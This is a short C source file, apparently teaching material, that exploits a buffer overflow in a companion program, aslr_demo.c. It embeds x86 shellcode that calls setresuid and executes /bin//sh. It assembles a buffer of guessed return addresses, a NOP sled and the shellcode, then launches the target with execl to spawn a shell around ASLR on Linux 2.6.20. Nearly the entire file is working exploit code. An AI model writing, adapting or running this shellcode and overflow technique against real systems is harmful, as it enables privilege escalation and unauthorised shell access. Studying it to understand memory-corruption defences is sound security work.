/**
  ******************************************************************************
  * @file    aslr_exploit.c
  * @version V1.0.0
  * @brief   Spawn a shell bypassing ASLR
  ******************************************************************************
  * @description
  *
  * This program exploits a Buffer overflow vulnerability of the aslr_demo.c
  * program and spawns a shell bypassing ASLR restrictions.
  * The program overwrites the main() function return address with the expected
  * shellcode address by exploiting a vulnerability in the Linux (2.6.20) memory
  * allocation when a new process image is created with execl(3).
  *
  * Buffer = [ shellcode_addr + NOP_sleds + shellcode ]
  *
  *
  * Ref. http://man7.org/linux/man-pages/man3/exec.3.html
  *
  ******************************************************************************
  */

#include <stdio.h>
#include <unistd.h>
#include <string.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80"; // exec_shell

int main(int argc, char *argv[]) {
  unsigned int i, ret, offset;
  char buffer[1000];

  printf("i is at %p\n", &i);

  if(argc > 1){
    offset = atoi(argv[1]);
  }else{
    offset = 990; // expected offset between i and buffer
  }

  /* Set return address to NOPs location*/
  ret = (unsigned int) &i - offset + 200;
  printf("ret addr is %p\n", ret);

  /* Fill buffer with return address */
  for(i=0; i < 90; i+=4){
    *((unsigned int *)(buffer+i)) = ret;
  }
  /* Fill buffer with NOPs */
  memset(buffer+84, 0x90, 900);
  /* Fill buffer with shellcode */
  memcpy(buffer+900, shellcode, sizeof(shellcode));

  /* Exploit */
  execl("./aslr_demo", "aslr_demo", buffer,  NULL);
}
